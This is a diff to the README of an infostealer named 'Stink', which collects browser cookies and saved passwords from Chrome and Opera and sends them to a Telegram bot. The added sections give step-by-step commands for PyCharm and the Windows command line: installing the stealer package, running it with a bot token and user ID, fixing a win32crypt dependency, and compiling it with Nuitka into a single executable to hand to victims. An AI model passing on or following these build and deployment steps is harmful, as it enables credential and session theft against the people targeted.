@@ -18,8 +18,9 @@ Cookies and passwords stealer in just 2 lines. Sending to Telegram.
   * [Getting token](#Getting-token)
   * [Getting id](#Getting-id)
 * [Creating exe](#Creating-exe)
-  * [Installing the required tools](#Installing-the-required-tools)
   * [Creating executable file](#Creating-executable-file)
+  * [PyCharm](#PyCharm)
+  * [CMD](#CMD)
 
 ### Current features
 1. Collecting cookies and passwords of the following browsers: Chrome, Opera, Opera GX.
@@ -112,18 +113,6 @@ In the custom stealer, you need to prescribe the necessary browsers and the path
 Python is an interpreted programming language, so we first translate it into C++ and then compile it into an .exe file.
 We will need Nuitka to do this.
 
-### Installing the required tools
-
-Installing Nuitka:
-```
-pip install Nuitka==0.6.16.4
-```
-
-Installing Stink:
-```
-pip install stink==0.0.3
-```
-
 ### Creating executable file
 
 Create a test.py (or any other name) file with the following code:
@@ -132,8 +121,52 @@ from stink.multistealer import Stealer
 
 Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
-Open a Python terminal. Go to the directory with the project and type the following command (or just open the terminal if you use PyCharm):
+### PyCharm
+1. Install Nuitka and Stink:
+```
+pip install Nuitka==0.6.16.4
+```
+
+```
+pip install stink==0.0.3
+```
+2. Open a terminal and type in a command:
 ```python
 nuitka --onefile --include-package=stink test.py
 ```
+
+### CMD
+1. Open `cmd`.
+
+2. Type in the command:
+```
+pip install virtualenv
+```
+3. Go to the folder with the test.py file:
+```
+cd path\to\file
+```
+4. Create a virtual environment and activate it:
+```
+virtualenv venv
+```
+
+```
+venv\Scripts\activate
+```
+5. Install Nuitka and Stink:
+```
+pip install Nuitka==0.6.16.4
+```
+
+```
+pip install stink==0.0.3
+```
+6. In the appearing folder venv go to the path `\Lib\site-packages\win32\`, copy the file `win32crypt.pyd` and paste in the path `\Lib\site-packages\`.
+
+7. Go back to `cmd` and write the command:
+```
+nuitka --onefile --include-package=stink stink_test.py
+```
+
 After executing the command, we get a test.exe file.
